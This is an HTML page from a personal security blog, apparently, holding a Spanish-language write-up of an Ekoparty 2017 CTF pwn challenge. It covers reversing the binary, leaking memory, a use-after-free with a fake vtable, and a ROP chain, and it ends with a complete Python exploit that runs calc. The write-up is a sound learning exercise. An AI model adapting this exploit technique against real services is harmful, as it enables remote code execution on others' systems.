@@ -1,0 +1,230 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+  <title>s1kr10s // CTF Ekoparty 2017-2019 PWN</title>
+  <link rel="shortcut icon" href="../images/icon.png">
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
+    :root { --green:#00ff41; --green-dim:#00b32c; --green-dark:#003b0f; --cyan:#00ffff; --amber:#ffb000; --bg:#000; --scanline:rgba(0,255,65,0.03); }
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html { overflow-y:scroll; }
+    html,body { background:var(--bg); color:var(--green); font-family:'Share Tech Mono','Courier New',monospace; overflow-x:hidden; min-height:100vh; }
+    body::before { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:repeating-linear-gradient(0deg,transparent,transparent 2px,var(--scanline) 2px,var(--scanline) 4px); pointer-events:none; z-index:9999; }
+    body::after { content:''; position:fixed; top:0; left:0; width:100%; height:100%; background:radial-gradient(ellipse at center,transparent 60%,rgba(0,0,0,0.85) 100%); pointer-events:none; z-index:9998; }
+    canvas#matrix { position:fixed; top:0; left:0; width:100%; height:100%; z-index:0; opacity:0.07; }
+    .wrapper { position:relative; z-index:10; max-width:1100px; margin:0 auto; padding:0 20px; }
+    nav { border-bottom:1px solid var(--green-dim); padding:12px 0; }
+    nav ul { list-style:none; display:flex; flex-wrap:wrap; gap:5px; align-items:center; }
+    nav ul li a { color:var(--green-dim); text-decoration:none; padding:4px 12px; border:1px solid transparent; font-size:0.9rem; letter-spacing:1px; transition:all 0.15s; }
+    nav ul li a:hover { color:var(--green); border-color:var(--green); text-shadow:0 0 8px var(--green); background:rgba(0,255,65,0.05); }
+    nav .brand { color:var(--green); font-size:1rem; letter-spacing:2px; text-shadow:0 0 10px var(--green); margin-right:auto; }
+    .page-header { padding:30px 0 5px; }
+    .prompt-line { color:var(--green); font-size:1.05rem; margin-bottom:25px; text-shadow:0 0 5px var(--green); }
+    .prompt-line .user { color:var(--cyan); text-shadow:0 0 8px var(--cyan); }
+    .prompt-line .path { color:var(--green-dim); }
+    .cursor { display:inline-block; width:9px; height:1em; background:var(--green); vertical-align:text-bottom; animation:blink 1s step-end infinite; box-shadow:0 0 8px var(--green); }
+    @keyframes blink { 50%{opacity:0;} }
+    .post-container { padding:5px 0 40px; }
+    .post-title { color:var(--green); font-size:1.3rem; text-shadow:0 0 8px var(--green); padding:10px 0 15px; letter-spacing:1px; }
+    .post-hr { border:none; border-top:1px solid var(--green-dark); margin:0 0 25px; }
+    .post-body { color:#c0d8c0; font-size:0.95rem; line-height:1.8; text-align:justify; }
+    .post-body img { max-width:100%; height:auto; border-radius:4px; border:1px solid var(--green-dark); display:block; margin:10px auto; }
+    .post-body textarea, .post-body textarea.form-control { background:#030a03 !important; color:#00ff41 !important; border:1px solid var(--green-dark) !important; font-family:'Share Tech Mono','Courier New',monospace !important; font-size:0.78rem !important; padding:12px !important; width:100% !important; resize:none; line-height:1.5 !important; margin:5px 0; }
+    .post-body a { color:var(--cyan) !important; text-decoration:none; }
+    .post-body a:hover { text-shadow:0 0 6px var(--cyan); text-decoration:underline; }
+    footer { border-top:1px solid var(--green-dark); padding:20px 0; margin-top:20px; color:var(--green-dark); font-size:0.75rem; letter-spacing:1px; }
+    footer a { color:var(--green-dim); text-decoration:none; }
+    footer a:hover { color:var(--green); text-shadow:0 0 6px var(--green); }
+    ::-webkit-scrollbar { width:6px; background:#000; }
+    ::-webkit-scrollbar-thumb { background:var(--green-dark); }
+  </style>
+</head>
+<body>
+<canvas id="matrix"></canvas>
+<div class="wrapper">
+  <nav>
+    <ul>
+      <li><span class="brand">&gt; </span></li>
+      <li><a href="../index.html">[ ~/Start ]</a></li>
+      <li><a href="../whoami.html">[ ~/Whoami ]</a></li>
+      <li><a href="../ctf/ctf.html">[ ~/CTF's ]</a></li>
+    </ul>
+  </nav>
+  <div class="page-header">
+    <div class="prompt-line">
+      <span class="user">root</span>@<span class="host">pwn</span>:<span class="path">~/post</span>$ cat CTF_ekoparty_2017_pwn.txt
+      <span class="cursor"></span>
+    </div>
+  </div>
+  <div class="post-container">
+    <h2 class="post-title">CTF Ekoparty 2017, 2018 y 2019 (PWN!)</h2>
+    <hr class="post-hr">
+    <div class="post-body">
+      <p>
+        Este reto se trataba de desarrollar un exploit el cual debía obtener una ejecución de código a partir del binario. Este ejecutable fue de los CTF de Ekoparty 2017, de igual manera desarrollé los del 2018 y 2019 que lo pueden encontrar en el repositorio al final del post.
+        <br><br>
+        Ahora la idea de este post fue porque no existía un review de la solución y personalmente creo que es importante plasmar estos desarrollos en algún paper o lo que sea, ya me ayuda a aprender más mientras estoy explicando o enseñando de como lo desarrolle.
+        Entonces para empezar con el análisis lo primero que hago es cagar el binario a IDA para ver su arquitectura y validar algunas cosas que pueden dar información rápida, este punto fue complicado, ya que no tenía los símbolos y con más de 500 funciones.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/simbolos1.png" width="90%"></center><br><br>
+        Así que el paso siguiente fue identificar cosas pequeñas de estas funciones y revertir para ver que hacían. Esto tomo un poco de tiempo pero pude identificar algunas relevantes como main y socket y luego pase a renombrarlas, así marco un camino en el análisis.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/main1.png" width="50%"></center><br><br>
+        Como había dicho sobre un socket, este se listaba en el puerto 8888 esperando alguna interacción. Después de esto se debía cumplir algunas condiciones para ejecutar otro socket al puerto 4930.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/socket1.png" width="50%"></center><br><br>
+        Con este primer socket identifiqué algunos buffers en heap llamado a malloc() y otros bytes que seteaban tamaños y desplazamientos "offset" del buffer y otras variables. Aquí identifique una función de respuesta como send() la que utilice para filtrar memoria de 0x20 bytes, esto me ayudo a obtener direcciones stack, return, calcular punteros a vtable y sus funciones, chunk en heap, etc.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/leak1.png" width="50%"></center><br><br>
+        Después de realizar un leak de 0x19C0 bytes la conexión se cierra y crea una nueva en el puerto 4930 el que se genera multiplicando 8888 * 2 con la instrucción <b style="color:#ffb000;">shl eax, 1</b> y espera un segundo envio de payload.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/new_port1.png" width="50%"></center><br><br>
+        En esta segunda conexión analizamos la siguiente función que renombre como <b style="color:#ffb000;">vulnerable</b>. Luego de comprobar si el socket está correcto entramos a las validaciones.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/vulnerable1.png" width="50%"></center><br><br>
+        Debo evitar algunas comparaciones de <b style="color:#ffb000;">GetTickCount()</b> que nos devuelve un valor random evitando que siga por el flujo, por suerte existe un envió de esta data, así que solo debo recibir estos bytes utilizarlos como bypass y además de calcular algunas constantes con este valor para saltar al las rutinas que me llevaran a comprobar la vulnerabilidad.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/gettickcount1.png" width="60%"></center><br><br>
+        ya evitando el valor random debemos calcular este mismo valor con una constante para saltar a la función con el bug. Estos valores son los siguientes: (98543268h, 98543269h, 9854326Ch, 98543267h, 9854326Ah, 9854326Bh, <b style="color:#ffb000;">9854326Dh</b>, 98543265h).
+        La que resalta es la que nos interesa. Por lo tanto el cálculo que debo hacer es asi <b style="color:#ffb000;">9854326D-vRandom=Result</b> y al revertir la resta de <b style="color:#ffb000;">Result+vRandom=9854326D</b> con esto ya solucionamos el salto.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/calculo_func1.png" width="60%"></center><br><br>
+        Solo nos queda revertir un poco más y ver como puedo explotar esta vulnerabilidad:<br><br>
+        1 - En 9854326Dh encontré un <b style="color:#ffb000;">free()</b> luego de un <b style="color:#ffb000;">malloc()</b> y un <b style="color:#ffb000;">strncpy()</b>. Con estas funciones pude liberar una bloque luego volver a utilizar y copiar la data enviada en el primer payload a ese espacio como punteros.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/uaf1.png" width="60%"></center><br><br>
+        2 - Realizo una la llamada a la función obtenida de la vtable. Aquí hay un pequeño gran problema, lo que pasa es que existe una indirección de <b style="color:#ffb000;">rax+0x18</b>, donde calcula el inicio de vtable hacia nuestra función que controlamos, el problema es que el primer puntero a la función no son bytes ejecutables entonces si saltamos ahí donde normalmente debería estar el inicio de nuestra shellcode este no ejecuta y se bloquea. Para solucionar este problema tuve que calcular el offset de donde quedo mi chunk en le heap y dejarlo en rax para así utilizar la indirección de <b style="color:#ffb000;">rax+0x18</b> dentro de mi data y no a los punteros de las funciones.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/free1.png" width="60%"></center><br><br>
+        3 - Con esto solucionado deje un desplazamiento de 0x18 dentro de mi data que es el primer puntero a mi ROP.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/IDA.png" width="100%"></center><br><br>
+        4 - La lógica del ROP que utilice hace un stack pivot a los punteros escritos en la función controlada, luego de procesar todos los gadget retorno al stack original y ejecuto system evitando una lectura fuera de límites.<br><br>
+        Antes de pasar al detalle dejo este diagrama que realice, para poder explicar de manera gráfica como hice esta hazaña y como evite el primer puntero de la función de vtable.
+        <br><br><center><img src="https://raw.githubusercontent.com/s1kr10s/s1kr10s.github.io/master/images/diagramaUAF.png" width="90%"></center><br><br>
+            * hago un stack pivot a los a ROP donde esta mi funcion falsa de vtable<br>
+              <b style="color:#ffb000;">xchg rsp, rcx / add rsp, 28h / retn</b><br><br>
+            * guardo el puntero a calc en rcx<br>
+              <b style="color:#ffb000;">pop rcx / add [rax],al / add rsp, 38h / retn</b><br><br>
+            * guardo el puntero a system desde función a rbx<br>
+              <b style="color:#ffb000;">pop rbx / retn</b><br><br>
+            * muevo el puntero a system a rax para su copia<br>
+              <b style="color:#ffb000;">mov rax,rbx / add rsp,20h / pop rbx / retn</b><br><br>
+            * aprovechando el pop rbx de la instrucción anterior guardo la dirección de stack original<br>
+              <b style="color:#ffb000;">pop rbx</b><br><br>
+            * hago una copia del puntero a system en la dirección del stack original<br>
+              <b style="color:#ffb000;">mov [rbx],rax / add rsp,20h / pop rbx / retn</b><br><br>
+            * por último paso la dirección del stack original a rsp donde se encuentra el puntero a system y salto a ahí<br>
+              <b style="color:#ffb000;">pop rsp / retn</b><br><br>
+        <br><br>
+        Video:<br>
+        <a href="https://www.youtube.com/watch?v=REy0G5abyas" target="_blank">https://www.youtube.com/watch?v=REy0G5abyas</a>
+        <br><br>
+        Repo:<br>
+        <a href="https://github.com/s1kr10s/s1kr10s.github.io/tree/master/Binary/2017" target="_blank">https://github.com/s1kr10s/CTF/2017</a><br>
+        <a href="https://github.com/s1kr10s/s1kr10s.github.io/tree/master/Binary/2018" target="_blank">https://github.com/s1kr10s/CTF/2018</a><br>
+        <a href="https://github.com/s1kr10s/s1kr10s.github.io/tree/master/Binary/2019" target="_blank">https://github.com/s1kr10s/CTF/2019</a>
+        <br><br>
+        Code:<br>
+        <textarea rows="20" cols="100" disabled>
+import socket
+import struct
+from time import sleep
+#By Miguel MZ - s1kr10s
+
+host = "192.168.18.229"
+addr_func = 0x9854326D
+
+def connection(port):
+    print '[+] Init Connection {0}:{1}'.format(host, port)
+    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    con.connect((host, port))
+    return con
+
+def reverser(leak):
+    memory = leak[14:16]+leak[12:14]+leak[10:12]+leak[8:10]+leak[6:8]+leak[4:6]+leak[2:4]+leak[:2]
+    mem_int = struct.pack('<Q', int(memory, 16))
+    return struct.unpack('<Q', mem_int)[0]
+
+con_first = connection(8888)
+print '[+] Getting Memory Leak...'
+for i in range(208):
+    if i == 207:
+        payload = struct.pack('<Q', 0x8800000001)
+        con_first.send(payload + '\n')
+        break
+    else:
+        payload = struct.pack('<Q', 0x2000000001 * i)
+        con_first.send(payload + '\n')
+        sleep(0.3)
+        leak = con_first.recv(32)
+        print '     [*] Leak {}: {}'.format(i, leak.encode('hex'))
+        if i == 54: off_stack = reverser(leak.encode('hex')[46:62])
+        if i == 62: addr_binary = reverser(leak.encode('hex')[14:30])
+        if i == 204: addr_chunk = reverser(leak.encode('hex')[30:46])
+
+imagebase = addr_binary - 0x17801
+p_stack_vtable = off_stack - 0x1698
+p_stack_vtable_function = addr_chunk + 0x100b0
+ptr_cmd_exec = imagebase + 0x5898
+ptr_calc = p_stack_vtable_function + 248
+
+sleep(2)
+con_second = connection(4930)
+leak_GetTickCount = struct.unpack('<i', con_second.recv(8))[0]
+
+align_stack = struct.pack('<Q', imagebase + 0x1063)
+ropero  = struct.pack('<Q', imagebase + 0x19DB)
+ropero += struct.pack('<Q', ptr_calc)
+ropero += struct.pack('<Q', 0x0000000000000000) * 7
+ropero += struct.pack('<Q', imagebase + 0x6576)
+ropero += struct.pack('<Q', ptr_cmd_exec)
+ropero += struct.pack('<Q', imagebase + 0x2048)
+ropero += struct.pack('<Q', 0x0000000000000000) * 4
+ropero += struct.pack('<Q', off_stack)
+ropero += struct.pack('<Q', imagebase + 0xBEFC)
+ropero += struct.pack('<Q', 0x0000000000000000) * 5
+ropero += struct.pack('<Q', imagebase + 0x7C76)
+ropero += struct.pack('<Q', off_stack)
+
+func_jump = addr_func - leak_GetTickCount
+payload  = struct.pack('<I', leak_GetTickCount)
+payload += struct.pack('<I', func_jump)
+payload += struct.pack('<Q', 0x0000000000000000)
+payload += struct.pack('<I', 0x13E8)
+payload += '\x00' * 12
+payload += struct.pack('<Q', p_stack_vtable_function)
+payload += struct.pack('<Q', 0x0000000000000000) * 2
+payload += align_stack
+payload += struct.pack('<Q', 0x0000000000000000)
+payload += ropero
+payload += struct.pack('<Q', 0x0000000000000000)
+payload += 'calc\x00\x00\x00\x00'
+con_second.send(payload)
+        </textarea>
+      </p>
+    </div>
+  </div>
+  <footer>
+    <span>// &nbsp; root@pwn:~$ echo "The quieter you become, the more you are able to hear." &nbsp; // &nbsp;</span>
+    <a href="https://github.com/s1kr10s" target="_blank">github</a> &nbsp;|&nbsp;
+    <a href="https://x.com/s1kr10s" target="_blank">twitter/x</a> &nbsp;|&nbsp;
+    <a href="https://medium.com/@s1kr10s" target="_blank">medium</a>
+  </footer>
+</div>
+<script>
+  const canvas = document.getElementById('matrix');
+  const ctx = canvas.getContext('2d');
+  function resize() { canvas.width = window.innerWidth; canvas.height = window.innerHeight; }
+  resize(); window.addEventListener('resize', resize);
+  const chars = '01アイウエオカキクケコ<>{}[]\\!@#$%^&*ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
+  const fontSize = 13;
+  let cols = Math.floor(window.innerWidth / fontSize);
+  let drops = Array(cols).fill(1);
+  function drawMatrix() {
+    ctx.fillStyle = 'rgba(0,0,0,0.05)'; ctx.fillRect(0, 0, canvas.width, canvas.height);
+    ctx.fillStyle = '#00ff41'; ctx.font = fontSize + 'px Share Tech Mono, monospace';
+    cols = Math.floor(canvas.width / fontSize);
+    if (drops.length < cols) drops = drops.concat(Array(cols - drops.length).fill(1));
+    for (let i = 0; i < cols; i++) {
+      const c = chars[Math.floor(Math.random() * chars.length)];
+      ctx.fillText(c, i * fontSize, drops[i] * fontSize);
+      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+      drops[i]++;
+    }
+  }
+  setInterval(drawMatrix, 50);
+</script>
+</body>
+</html>
